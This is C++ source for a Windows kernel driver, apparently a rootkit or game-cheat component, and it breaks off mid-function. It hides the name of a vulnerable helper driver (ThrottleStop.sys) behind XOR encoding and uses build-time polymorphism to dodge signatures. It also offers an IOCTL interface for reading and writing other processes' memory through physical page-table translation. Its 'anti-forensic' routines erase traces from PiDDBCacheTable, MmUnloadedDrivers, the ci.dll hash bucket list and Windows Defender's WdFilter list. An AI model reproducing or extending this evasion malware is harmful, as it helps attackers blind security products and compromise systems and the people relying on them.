#include <ntifs.h>
#include <ntimage.h>
#include <intrin.h>
#pragma warning(disable: 4996)

// Kernel-safe wide-string helpers (no CRT dependency)
static void WcsAppend(WCHAR* dst, SIZE_T cch, const WCHAR* src) {
    SIZE_T pos = 0;
    while (pos < cch && dst[pos]) pos++;
    while (pos < cch - 1 && *src) dst[pos++] = *src++;
    if (pos < cch) dst[pos] = L'\0';
}
static void WcsAppendN(WCHAR* dst, SIZE_T cch, const WCHAR* src, SIZE_T n) {
    SIZE_T pos = 0;
    while (pos < cch && dst[pos]) pos++;
    for (SIZE_T i = 0; pos < cch - 1 && i < n; i++) dst[pos++] = src[i];
    if (pos < cch) dst[pos] = L'\0';
}
static void WcsAppendHex32(WCHAR* dst, SIZE_T cch, ULONG val) {
    SIZE_T pos = 0;
    while (pos < cch && dst[pos]) pos++;
    if (pos + 9 > cch) return;
    for (int i = 7; i >= 0; i--) {
        ULONG n = (val >> (i * 4)) & 0xF;
        dst[pos++] = (WCHAR)(n < 10 ? L'0' + n : L'a' + n - 10);
    }
    dst[pos] = L'\0';
}

// ============================================================================
// Build-time polymorphism
// ============================================================================
#include "../shared/shared_seed.h"
constexpr ULONG kBuildSeed = BUILD_SEED;

#define TAG_STATE  (0x74634D6D ^ (kBuildSeed & 0x00FFFFFF))
#define TAG_STAGE  (0x5346744E ^ (kBuildSeed & 0x00FFFFFF))

// ============================================================================
// Communication protocol
// ============================================================================
#define IOCTL_COMM CTL_CODE(FILE_DEVICE_NETWORK, 0x2A3, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define COMM_OP_READ           0UL
#define COMM_OP_WRITE          1UL
#define COMM_OP_GET_BASE       2UL
#define COMM_OP_GET_MODULE     3UL
#define COMM_OP_GET_STATUS     4UL
#define COMM_OP_CLEAN_VEHICLE  5UL
#define COMM_OP_INIT_TARGET    6UL
#define COMM_MAX_SIZE          (64UL * 1024UL * 1024UL)

#define COMM_HANDSHAKE_MAGIC   (0xDEAD1337 ^ (kBuildSeed & 0xFFFF0000))
#define COMM_HANDSHAKE_REPLY   (0xC0FFEE42 ^ (kBuildSeed & 0x0000FFFF))

// Vehicle driver name — XOR encrypted at compile time, decrypted on stack at runtime
// "ThrottleStop.sys" = 16 chars + null
#define VEH_XOR_KEY ((WCHAR)(kBuildSeed & 0xFF) | 0x20)  // ensures non-zero key
static const WCHAR kVehicleEnc[] = {
    L'T' ^ VEH_XOR_KEY, L'h' ^ VEH_XOR_KEY, L'r' ^ VEH_XOR_KEY, L'o' ^ VEH_XOR_KEY,
    L't' ^ VEH_XOR_KEY, L't' ^ VEH_XOR_KEY, L'l' ^ VEH_XOR_KEY, L'e' ^ VEH_XOR_KEY,
    L'S' ^ VEH_XOR_KEY, L't' ^ VEH_XOR_KEY, L'o' ^ VEH_XOR_KEY, L'p' ^ VEH_XOR_KEY,
    L'.' ^ VEH_XOR_KEY, L's' ^ VEH_XOR_KEY, L'y' ^ VEH_XOR_KEY, L's' ^ VEH_XOR_KEY,
    0
};

static VOID DecryptVehicleName(WCHAR* out) {
    for (int i = 0; i < 16; i++)
        out[i] = kVehicleEnc[i] ^ VEH_XOR_KEY;
    out[16] = L'\0';
}

// Helper: decrypt vehicle name to stack and init UNICODE_STRING
#define DECL_VEHICLE_NAME() \
    WCHAR _vehBuf[17]; \
    DecryptVehicleName(_vehBuf); \
    UNICODE_STRING vehicleName; \
    RtlInitUnicodeString(&vehicleName, _vehBuf)

struct COMM_PACKET {
    ULONG     Operation;
    ULONG     ProcessId;
    ULONGLONG AddressSrc;
    ULONGLONG AddressDst;
    ULONG     Size;
    LONG      Status;
    CHAR      ModuleName[256];
};

// ============================================================================
// External declarations
// ============================================================================
extern "C" POBJECT_TYPE* IoDriverObjectType;

extern "C" NTKERNELAPI NTSTATUS NTAPI ObReferenceObjectByName(
    PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState,
    ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode, PVOID ParseContext, PVOID* Object);

extern "C" NTKERNELAPI PVOID NTAPI PsGetProcessPeb(PEPROCESS Process);
extern "C" NTKERNELAPI PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(PVOID Base);
extern "C" NTKERNELAPI PVOID NTAPI PsGetProcessSectionBaseAddress(PEPROCESS Process);

extern "C" NTSTATUS NTAPI MmCopyVirtualMemory(
    PEPROCESS SourceProcess, PVOID SourceAddress,
    PEPROCESS TargetProcess, PVOID TargetAddress,
    SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);

#ifndef MM_COPY_MEMORY_PHYSICAL
#define MM_COPY_MEMORY_PHYSICAL 0x1
#endif

// ============================================================================
// Kernel structures
// ============================================================================
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _MI_UNLOADED_DRIVER {
    UNICODE_STRING Name;
    PVOID          StartAddress;
    PVOID          EndAddress;
    LARGE_INTEGER  CurrentTime;
} MI_UNLOADED_DRIVER, *PMI_UNLOADED_DRIVER;

typedef struct _PIDDBCACHE_ENTRY {
    LIST_ENTRY     List;
    UNICODE_STRING DriverName;
    ULONG          TimeDateStamp;
    NTSTATUS       LoadStatus;
    CHAR           _pad[16];
} PIDDBCACHE_ENTRY;

typedef struct _HASH_BUCKET_ENTRY {
    struct _HASH_BUCKET_ENTRY* Next;
    UNICODE_STRING             DriverName;
} HASH_BUCKET_ENTRY, *PHASH_BUCKET_ENTRY;

typedef void (NTAPI *MpFreeDriverInfoExFn)(PVOID);

// ============================================================================
// Status reporting
// ============================================================================
struct BYPASS_STATUS {
    unsigned long    WalkChainHooked;
    unsigned long    WalkChainUsedGadget;
    unsigned __int64 WalkChainGadgetVA;
    unsigned __int64 WalkChainPtrVA;
    unsigned long    CaveInstalled;
    unsigned long    _pad;
    unsigned __int64 CaveVA;
    char             CaveModule[64];
    unsigned long    PiDDBCleared;
    unsigned long    UnloadedCleared;
    unsigned long    KDUPath;
    unsigned long    _pad2;
    unsigned __int64 NtBase;
    unsigned long    VehiclePiDDBCleared;
    unsigned long    VehicleUnloadedCleared;
    unsigned long    KernelHashBucketCleared;
    unsigned long    CiDllFound;
    unsigned long    WdFilterCleared;
    unsigned long    WdFilterPatternOk;
    unsigned long    PoolStomped;
    unsigned long    _pad3;
    unsigned long    DiskSynced;
    unsigned long    RawDiskSynced;
    unsigned long    PoolScrubbed;
    unsigned long    _pad5;
    unsigned long    HdrPatched;
    unsigned long    SectionHdrPatched;
    unsigned long    WalkChainActive;
    unsigned long    _pad7;
    unsigned __int64 WalkChainSlotVA;
    unsigned long    KernelHashBucketEmpty;
    unsigned long    CiGlobalsFound;
    unsigned long    VehicleUnloadedLive;
    unsigned long    CiSectionFound;
    unsigned long    PhysicalRW;
    unsigned long    StompTarget;
    unsigned long    HostDriver;
    unsigned long    DeferredCleanupDone;
};

// ============================================================================
// ALL mutable state lives here — allocated in NonPagedPool (always RW)
// The stomped image's .data only holds the g_state pointer (set once, never written again)
// ============================================================================
typedef struct { WORK_QUEUE_ITEM Item; PVOID NtBase; } CLEANUP_WORK;

struct DRIVER_STATE {
    BYPASS_STATUS         drvStatus;
    PDEVICE_OBJECT        pDevice;
    PDRIVER_DISPATCH      origDevCtrl;
    PDRIVER_OBJECT        borrowedDrv;
    PVOID                 ntBase;
    PMI_UNLOADED_DRIVER   mmUnloadedArr;
    void**                pWalkChainPtr;
    void*                 origWalkChain;
    PEPROCESS             cachedProcess;
    UINT64                cachedDirBase;
    PLDR_DATA_TABLE_ENTRY poisonedLdr;
    UNICODE_STRING        savedFullDllName;
    UNICODE_STRING        savedBaseDllName;
    CLEANUP_WORK          cleanupWork;
    WCHAR                 stompFilePath[300];
};

// Single pointer — set BEFORE stomp, baked into stomped image, never written to again
static DRIVER_STATE* g_state = nullptr;

#if DBG
#define LOG(fmt, ...) DbgPrint(fmt, ##__VA_ARGS__)
#else
#define LOG(fmt, ...) ((void)0)
#endif

// ============================================================================
// Forward declarations
// ============================================================================
static VOID ClearUnloadedEntryByName(PVOID ntBase, PUNICODE_STRING targetName);
static NTSTATUS DispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// ============================================================================
// PE / Utility functions
// ============================================================================

static BOOLEAN IsKernelPointer(PVOID addr) {
    return (ULONG_PTR)addr >= 0xFFFF800000000000ULL && MmIsAddressValid(addr);
}

static PUCHAR PatternScan(PUCHAR base, SIZE_T size, const UCHAR* pat, SIZE_T patLen) {
    if (size < patLen) return nullptr;
    for (SIZE_T i = 0; i <= size - patLen; i++) {
        BOOLEAN ok = TRUE;
        for (SIZE_T j = 0; j < patLen; j++) {
            if (pat[j] != 0xFF && base[i + j] != pat[j]) { ok = FALSE; break; }
        }
        if (ok) return base + i;
    }
    return nullptr;
}

static BOOLEAN GetImageSection(PVOID imageBase, const char* name,
                                PUCHAR* outBase, PSIZE_T outSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)imageBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (strncmp((char*)sec->Name, name, IMAGE_SIZEOF_SHORT_NAME) == 0) {
            *outBase = (PUCHAR)imageBase + sec->VirtualAddress;
            *outSize = (SIZE_T)sec->Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

static PVOID GetNtExport(PVOID moduleBase, const char* name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PUCHAR)moduleBase + dos->e_lfanew);
    ULONG expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva) return nullptr;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)moduleBase + expRva);
    PULONG  funcs = (PULONG) ((PUCHAR)moduleBase + exp->AddressOfFunctions);
    PULONG  names = (PULONG) ((PUCHAR)moduleBase + exp->AddressOfNames);
    PUSHORT ords  = (PUSHORT)((PUCHAR)moduleBase + exp->AddressOfNameOrdinals);
    for (ULONG i = 0; i < exp->NumberOfNames; i++) {
        const char* exportName = (const char*)((PUCHAR)moduleBase + names[i]);
        if (_stricmp(exportName, name) == 0)
            return (PVOID)((PUCHAR)moduleBase + funcs[ords[i]]);
    }
    return nullptr;
}

// ============================================================================
// Kernel base discovery
// ============================================================================

static PVOID GetNtKernelBaseAlt() {
    static const WCHAR* const kExports[] = { L"RtlWalkFrameChain", L"MmGetPhysicalAddress" };
    for (ULONG e = 0; e < ARRAYSIZE(kExports); e++) {
        UNICODE_STRING name;
        RtlInitUnicodeString(&name, kExports[e]);
        PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&name);
        if (!fn) continue;
        PUCHAR page = (PUCHAR)((ULONG_PTR)fn & ~0xFFFULL);
        for (ULONG i = 0; i < 0x1000; i++, page -= 0x1000) {
            if (!MmIsAddressValid(page)) continue;
            if (*(USHORT*)page != IMAGE_DOS_SIGNATURE) continue;
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)page;
            if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x800) continue;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(page + dos->e_lfanew);
            if (!MmIsAddressValid(nt)) continue;
            if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
            ULONG imgSize = nt->OptionalHeader.SizeOfImage;
            if (imgSize == 0 || fn < page || fn >= page + imgSize) continue;
            return page;
        }
    }
    return nullptr;
}

// ============================================================================
// Module helpers
// ============================================================================

static PLDR_DATA_TABLE_ENTRY FindModuleLdrEntry(PVOID ntBase, PCWSTR name) {
    PVOID listPtr = GetNtExport(ntBase, "PsLoadedModuleList");
    if (!listPtr || !IsKernelPointer(listPtr)) return nullptr;
    UNICODE_STRING target;
    RtlInitUnicodeString(&target, name);
    PLIST_ENTRY head = (PLIST_ENTRY)listPtr;
    for (PLIST_ENTRY e = head->Flink; e && e != head; e = e->Flink) {
        if (!MmIsAddressValid(e)) break;
        PLDR_DATA_TABLE_ENTRY ldr = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (!MmIsAddressValid(ldr->BaseDllName.Buffer)) continue;
        if (RtlEqualUnicodeString(&ldr->BaseDllName, &target, TRUE))
            return ldr;
    }
    return nullptr;
}

static PVOID FindModuleBase(PVOID ntBase, PCWSTR moduleName) {
    PLDR_DATA_TABLE_ENTRY ldr = FindModuleLdrEntry(ntBase, moduleName);
    return ldr ? ldr->DllBase : nullptr;
}

static PVOID FindSelfBase(PVOID hint) {
    PUCHAR page = (PUCHAR)((ULONG_PTR)hint & ~0xFFFULL);
    for (ULONG i = 0; i < 0x200; i++, page -= 0x1000) {
        if (!MmIsAddressValid(page)) continue;
        if (*(USHORT*)page != IMAGE_DOS_SIGNATURE) continue;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)page;
        if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x1000) continue;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(page + dos->e_lfanew);
        if (!MmIsAddressValid(nt)) continue;
        if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
        ULONG imgSize = nt->OptionalHeader.SizeOfImage;
        if (imgSize && (PUCHAR)hint >= page && (PUCHAR)hint < page + imgSize)
            return page;
    }
    return nullptr;
}

// ============================================================================
// Physical memory R/W — CR3-based
// ============================================================================

static NTSTATUS ReadPhysicalAddr(UINT64 pa, PVOID dst, SIZE_T size) {
    MM_COPY_ADDRESS addr;
    addr.PhysicalAddress.QuadPart = (LONGLONG)pa;
    SIZE_T copied = 0;
    return MmCopyMemory(dst, addr, size, MM_COPY_MEMORY_PHYSICAL, &copied);
}

static UINT64 TranslateVA(UINT64 dirBase, UINT64 va) {
    UINT64 val = 0;
    UINT64 pml4e_addr = (dirBase & ~0xFFFULL) + ((va >> 39) & 0x1FF) * 8;
    if (!NT_SUCCESS(ReadPhysicalAddr(pml4e_addr, &val, 8))) return 0;
    if (!(val & 1)) return 0;
    UINT64 pdpte_addr = (val & ~0xFFFULL) + ((va >> 30) & 0x1FF) * 8;
    if (!NT_SUCCESS(ReadPhysicalAddr(pdpte_addr, &val, 8))) return 0;
    if (!(val & 1)) return 0;
    if (val & 0x80) return (val & 0xFFFFFFC0000000ULL) + (va & 0x3FFFFFFF);
    UINT64 pde_addr = (val & ~0xFFFULL) + ((va >> 21) & 0x1FF) * 8;
    if (!NT_SUCCESS(ReadPhysicalAddr(pde_addr, &val, 8))) return 0;
    if (!(val & 1)) return 0;
    if (val & 0x80) return (val & 0xFFFFFFFE00000ULL) + (va & 0x1FFFFF);
    UINT64 pte_addr = (val & ~0xFFFULL) + ((va >> 12) & 0x1FF) * 8;
    if (!NT_SUCCESS(ReadPhysicalAddr(pte_addr, &val, 8))) return 0;
    if (!(val & 1)) return 0;
    return (val & ~0xFFFULL) + (va & 0xFFF);
}

static NTSTATUS PhysicalRead(UINT64 dirBase, UINT64 srcVa, PVOID dst, SIZE_T size) {
    SIZE_T copied = 0;
    while (copied < size) {
        UINT64 pa = TranslateVA(dirBase, srcVa + copied);
        if (!pa) return STATUS_ACCESS_VIOLATION;
        SIZE_T pageOff = (srcVa + copied) & 0xFFF;
        SIZE_T chunk = min(PAGE_SIZE - pageOff, size - copied);
        NTSTATUS st = ReadPhysicalAddr(pa, (PUCHAR)dst + copied, chunk);
        if (!NT_SUCCESS(st)) return st;
        copied += chunk;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS PhysicalWrite(UINT64 dirBase, UINT64 dstVa, PVOID src, SIZE_T size) {
    SIZE_T written = 0;
    while (written < size) {
        UINT64 pa = TranslateVA(dirBase, dstVa + written);
        if (!pa) return STATUS_ACCESS_VIOLATION;
        SIZE_T pageOff = (dstVa + written) & 0xFFF;
        SIZE_T chunk = min(PAGE_SIZE - pageOff, size - written);

        // Use MmMapIoSpace for physical write — MmGetVirtualForPhysical
        // doesn't work for user-mode pages that lack a system VA mapping
        PHYSICAL_ADDRESS phys;
        phys.QuadPart = (LONGLONG)pa;
        PVOID mapped = MmMapIoSpace(phys, chunk, MmCached);
        if (!mapped) return STATUS_INSUFFICIENT_RESOURCES;
        RtlCopyMemory(mapped, (PUCHAR)src + written, chunk);
        MmUnmapIoSpace(mapped, chunk);
        written += chunk;
    }
    return STATUS_SUCCESS;
}

static UINT64 FindProcessModule(PEPROCESS process, UINT64 dirBase, const CHAR* name) {
    PVOID pebRaw = PsGetProcessPeb(process);
    if (!pebRaw) return 0;
    UINT64 peb = (UINT64)pebRaw;
    UINT64 ldr = 0;
    if (!NT_SUCCESS(PhysicalRead(dirBase, peb + 0x18, &ldr, sizeof(ldr))) || !ldr) return 0;
    UINT64 listHead = ldr + 0x20;
    UINT64 flink = 0;
    if (!NT_SUCCESS(PhysicalRead(dirBase, listHead, &flink, sizeof(flink))) || !flink) return 0;
    for (INT guard = 0; guard < 512 && flink && flink != listHead; guard++) {
        UINT64 entry = flink - 0x10;
        UINT64 dllBase = 0; USHORT nameLen = 0; UINT64 nameBuf = 0;
        PhysicalRead(dirBase, entry + 0x30, &dllBase, sizeof(dllBase));
        PhysicalRead(dirBase, entry + 0x58, &nameLen, sizeof(nameLen));
        PhysicalRead(dirBase, entry + 0x60, &nameBuf, sizeof(nameBuf));
        if (nameBuf && nameLen >= 2 && nameLen <= 512) {
            WCHAR wide[256] = {};
            ULONG copyLen = min((ULONG)nameLen, (ULONG)(sizeof(wide) - sizeof(WCHAR)));
            if (NT_SUCCESS(PhysicalRead(dirBase, nameBuf, wide, copyLen))) {
                wide[copyLen / sizeof(WCHAR)] = L'\0';
                ULONG wlen = copyLen / sizeof(WCHAR);
                ULONG nlen = (ULONG)strlen(name);
                BOOLEAN match = (wlen == nlen);
                for (ULONG j = 0; j < wlen && match; j++) {
                    WCHAR wc = wide[j]; CHAR nc = name[j];
                    if (wc >= L'A' && wc <= L'Z') wc += 32;
                    if (nc >= 'A'  && nc <= 'Z')  nc += 32;
                    if (wc != (WCHAR)(UCHAR)nc) match = FALSE;
                }
                if (match) return dllBase;
            }
        }
        UINT64 next = 0;
        if (!NT_SUCCESS(PhysicalRead(dirBase, flink, &next, sizeof(next)))) break;
        flink = next;
    }
    return 0;
}

// ============================================================================
// Anti-forensic: PiDDB
// ============================================================================

static BOOLEAN FindPiDDBTable(PVOID ntBase, PERESOURCE* outLock, PRTL_AVL_TABLE* outTable) {
    static const UCHAR patLock[] = {
        0x48, 0x8D, 0x0D, 0xFF, 0xFF, 0xFF, 0xFF, 0xB2, 0x01,
        0x66, 0xFF, 0x88, 0xFF, 0xFF, 0xFF, 0xFF, 0x90, 0xE8
    };
    static const UCHAR patTable[] = { 0x48, 0x8B, 0xF9, 0x33, 0xC0, 0x48, 0x8D, 0x0D };
    PUCHAR pageBase; SIZE_T pageSize;
    if (!GetImageSection(ntBase, "PAGE", &pageBase, &pageSize)) return FALSE;
    PUCHAR matchLock  = PatternScan(pageBase, pageSize, patLock, sizeof(patLock));
    PUCHAR matchTable = PatternScan(pageBase, pageSize, patTable, sizeof(patTable));
    if (!matchLock || !matchTable) return FALSE;
    PERESOURCE pLock = (PERESOURCE)(matchLock + 7 + *(LONG*)(matchLock + 3));
    PRTL_AVL_TABLE pTable = (PRTL_AVL_TABLE)(matchTable + 12 + *(LONG*)(matchTable + 8));
    if (!IsKernelPointer(pLock) || !IsKernelPointer(pTable)) return FALSE;
    *outLock = pLock; *outTable = pTable;
    return TRUE;
}

static VOID ClearPiDDBEntryByName(PVOID ntBase, PUNICODE_STRING targetName) {
    PERESOURCE pLock; PRTL_AVL_TABLE pTable;
    if (!FindPiDDBTable(ntBase, &pLock, &pTable)) return;
    ExAcquireResourceExclusiveLite(pLock, TRUE);
    PVOID toDelete[16] = {}; ULONG count = 0;
    for (PVOID node = RtlEnumerateGenericTableAvl(pTable, TRUE);
         node && count < 16; node = RtlEnumerateGenericTableAvl(pTable, FALSE)) {
        PIDDBCACHE_ENTRY* e = (PIDDBCACHE_ENTRY*)node;
        if (e->DriverName.Buffer && RtlEqualUnicodeString(&e->DriverName, targetName, TRUE))
            toDelete[count++] = node;
    }
    for (ULONG i = 0; i < count; i++) {
        RemoveEntryList((PLIST_ENTRY)toDelete[i]);
        RtlDeleteElementGenericTableAvl(pTable, toDelete[i]);
    }
    if (count) g_state->drvStatus.VehiclePiDDBCleared = 1;
    ExReleaseResourceLite(pLock);
}

// ============================================================================
// Anti-forensic: MmUnloadedDrivers
// ============================================================================

static PMI_UNLOADED_DRIVER FindMmUnloadedArray(PVOID ntBase) {
    static const UCHAR pat[] = { 0x4C, 0x8B, 0x15, 0xFF, 0xFF, 0xFF, 0xFF };
    PUCHAR textBase; SIZE_T textSize;
    if (!GetImageSection(ntBase, ".text", &textBase, &textSize)) return nullptr;
    PUCHAR match = PatternScan(textBase, textSize, pat, sizeof(pat));
    if (!match) return nullptr;
    PVOID* arrSlot = (PVOID*)(match + 7 + *(LONG*)(match + 3));
    if (!IsKernelPointer(arrSlot)) return nullptr;
    PMI_UNLOADED_DRIVER arr = *(PMI_UNLOADED_DRIVER*)arrSlot;
    if (!arr || !IsKernelPointer(arr)) return nullptr;
    return arr;
}

static VOID ClearUnloadedEntryByName(PVOID ntBase, PUNICODE_STRING targetName) {
    PMI_UNLOADED_DRIVER arr = FindMmUnloadedArray(ntBase);
    if (!arr) return;
    for (ULONG i = 0; i < 50; i++) {
        if (arr[i].Name.Buffer && RtlEqualUnicodeString(&arr[i].Name, targetName, TRUE)) {
            RtlZeroMemory(&arr[i], sizeof(MI_UNLOADED_DRIVER));
            g_state->drvStatus.VehicleUnloadedCleared = 1;
        }
    }
}

// ============================================================================
// Anti-forensic: ci.dll hash bucket
// ============================================================================

static VOID ClearKernelHashBucketList(PVOID ntBase) {
    PVOID ciBase = FindModuleBase(ntBase, L"ci.dll");
    if (!ciBase) return;
    g_state->drvStatus.CiDllFound = 1;
    static const UCHAR pat[] = {
        0x48, 0x8B, 0x1D, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00
    };
    PUCHAR pageBase; SIZE_T pageSize;
    if (!GetImageSection(ciBase, "PAGE", &pageBase, &pageSize)) return;
    PUCHAR match = PatternScan(pageBase, pageSize, pat, sizeof(pat));
    if (!match) return;
    PVOID listHead = (PVOID)(match + 7 + *(LONG*)(match + 3));
    PERESOURCE lock = nullptr;
    SIZE_T lookback = (SIZE_T)(match - pageBase);
    if (lookback > 50) lookback = 50;
    for (SIZE_T j = lookback; j >= 7; j--) {
        PUCHAR q = match - j;
        if (q[0] == 0x48 && q[1] == 0x8D && q[2] == 0x0D) {
            lock = (PERESOURCE)(q + 7 + *(LONG*)(q + 3));
            break;
        }
    }
    if (!lock) return;
    g_state->drvStatus.CiGlobalsFound = 1;
    DECL_VEHICLE_NAME();
    KeEnterCriticalRegion();
    ExAcquireResourceExclusiveLite(lock, TRUE);
    if (*(PHASH_BUCKET_ENTRY*)listHead == nullptr) {
        g_state->drvStatus.KernelHashBucketEmpty = 1;
        ExReleaseResourceLite(lock); KeLeaveCriticalRegion(); return;
    }
    PHASH_BUCKET_ENTRY* prev = (PHASH_BUCKET_ENTRY*)listHead;
    PHASH_BUCKET_ENTRY entry = nullptr;
    while ((ULONG_PTR)prev >= 0xFFFF800000000000ULL && (entry = *prev) != nullptr) {
        if ((ULONG_PTR)entry < 0xFFFF800000000000ULL) break;
        UNICODE_STRING* fullPath = &entry->DriverName;
        if (fullPath->Buffer && fullPath->Length > 0 && (ULONG_PTR)fullPath->Buffer >= 0xFFFF800000000000ULL) {
            UNICODE_STRING baseName = *fullPath;
            for (USHORT i = fullPath->Length / sizeof(WCHAR); i > 0; i--) {
                if (fullPath->Buffer[i - 1] == L'\\') {
                    baseName.Buffer = fullPath->Buffer + i;
                    baseName.Length = fullPath->Length - (USHORT)(i * sizeof(WCHAR));
                    baseName.MaximumLength = baseName.Length;
                    break;
                }
            }
            if (RtlEqualUnicodeString(&baseName, &vehicleName, TRUE)) {
                *prev = entry->Next;
                ExFreePoolWithTag(entry, 0);
                g_state->drvStatus.KernelHashBucketCleared = 1;
                break;
            }
        }
        prev = &entry->Next;
    }
    ExReleaseResourceLite(lock);
    KeLeaveCriticalRegion();
}

// ============================================================================
// Anti-forensic: WdFilter
// ============================================================================

static VOID ClearWdFilterDriverList(PVOID ntBase) {
    PVOID wdBase = FindModuleBase(ntBase, L"WdFilter.sys");
    if (!wdBase) return;
    static const UCHAR patList[] = {
        0x48, 0x8B, 0x0D, 0xFF, 0xFF, 0xFF, 0xFF,
        0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x39, 0x11
    };
    static const UCHAR patFree[] = {
        0x89, 0xFF, 0x08, 0xE8, 0xFF, 0xFF, 0xFF, 0xFF,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xE9
    };
    PUCHAR pageBase; SIZE_T pageSize;
    if (!GetImageSection(wdBase, "PAGE", &pageBase, &pageSize)) return;
    PUCHAR matchList = PatternScan(pageBase, pageSize, patList, sizeof(patList));
    PUCHAR matchFree = PatternScan(pageBase, pageSize, patFree, sizeof(patFree));
    if (!matchList || !matchFree) return;
    PVOID* pBlink = (PVOID*)(matchList + 7 + *(INT32*)(matchList + 3));
    PLIST_ENTRY pHead = (PLIST_ENTRY)((PUCHAR)pBlink - sizeof(PVOID));
    ULONG* pCount = (ULONG*)(matchList + 13 + *(INT32*)(matchList + 9));
    PVOID* pArray = *(PVOID**)((PUCHAR)pCount + 8);
    MpFreeDriverInfoExFn fn = (MpFreeDriverInfoExFn)(matchFree + 8 + *(INT32*)(matchFree + 4));
    if (!IsKernelPointer(pHead) || !IsKernelPointer(pCount) || !IsKernelPointer(fn)) return;
    g_state->drvStatus.WdFilterPatternOk = 1;
    DECL_VEHICLE_NAME();
    for (PLIST_ENTRY entry = pHead->Flink; entry && entry != pHead && MmIsAddressValid(entry); entry = entry->Flink) {
        UNICODE_STRING* ustr = (UNICODE_STRING*)((PUCHAR)entry + 0x10);
        if (!ustr->Buffer || !ustr->Length || !MmIsAddressValid(ustr->Buffer)) continue;
        UNICODE_STRING baseName = *ustr;
        for (USHORT i = ustr->Length / sizeof(WCHAR); i > 0; i--) {
            if (ustr->Buffer[i - 1] == L'\\') {
                baseName.Buffer = ustr->Buffer + i;
                baseName.Length = ustr->Length - (USHORT)(i * sizeof(WCHAR));
                baseName.MaximumLength = baseName.Length; break;
            }
        }
        if (!RtlEqualUnicodeString(&baseName, &vehicleName, TRUE)) continue;
        PVOID sameIndexList = (PVOID)((PUCHAR)entry - 0x10);
        if (pArray) {
            PVOID sentinel = (PVOID)((PUCHAR)pCount + 1);
            for (int k = 0; k < 256; k++) {
                if (!MmIsAddressValid(&pArray[k])) break;
                if (pArray[k] == sameIndexList) { pArray[k] = sentinel; break; }
            }
        }
        RemoveEntryList(entry); (*pCount)--;
        PVOID driverInfo = (PVOID)((PUCHAR)entry - 0x20);
        if (*(USHORT*)driverInfo == 0xDA18) fn(driverInfo);
        g_state->drvStatus.WdFilterCleared = 1;
        return;
    }
}

// ============================================================================
// RtlWalkFrameChain hook
// ============================================================================

static void** FindRtlWalkFrameChainPtr(PVOID ntBase) {
    UNICODE_STRING name = RTL_CONSTANT_STRING(L"RtlWalkFrameChain");
    PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&name);
    if (!fn) return nullptr;
    PUCHAR ntTextBase = nullptr; SIZE_T ntTextSize = 0;
    GetImageSection(ntBase, ".text", &ntTextBase, &ntTextSize);
    for (int i = 0; i < 256; i++) {
        if (!MmIsAddressValid(fn + i + 7)) break;
        PUCHAR p = fn + i;
        if (p[0] == 0xFF && (p[1] == 0x15 || p[1] == 0x25)) {
            INT32 disp = *(INT32*)(p + 2);
            void** slot = (void**)(p + 6 + (LONG_PTR)disp);
            if (IsKernelPointer(slot) && MmIsAddressValid(slot)) return slot;
        }
        if ((p[0] & 0xF0) == 0x48 && p[1] == 0x8B && (p[2] & 0xC7) == 0x05) {
            INT32 disp = *(INT32*)(p + 3);
            void** slot = (void**)(p + 7 + (LONG_PTR)disp);
            if (IsKernelPointer(slot) && MmIsAddressValid(slot)) {
                PVOID val = *(PVOID*)slot;
                if (IsKernelPointer(val)) return slot;
            }
        }
    }
    // Fallback: walk all writable non-code sections in ntoskrnl for a pointer
    // equal to the export VA. Catches builds where the disassembly scan fails
    // because RtlWalkFrameChain no longer uses an indirect call in its prologue.
    PVOID target = (PVOID)fn;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntBase;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)ntBase + dos->e_lfanew);
